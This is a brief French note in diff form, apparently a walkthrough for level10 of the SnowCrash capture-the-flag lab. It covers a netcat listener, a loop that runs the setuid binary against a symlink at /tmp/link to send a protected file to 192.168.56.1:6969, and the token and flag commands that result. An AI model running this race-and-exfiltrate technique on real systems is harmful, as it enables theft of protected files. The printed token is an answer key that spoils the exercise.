@@ -1,0 +1,15 @@
+ifconfig sur l'ordi -> 192.168.56.1
+192 * 2^24 + 168  * 2^16 + 56 * 2^8 + 1 = 3232249857
+
+gcc mini_serv ; ./a.out 6969
+
+sh link.sh in snowcrash
+
+nc 192.168.56.1 6969
+
+while no token do :
+./level10 /tmp/link 192.168.56.1
+token : woupa2yuojeeaaed06riuj63c
+
+su flag10
+getflag
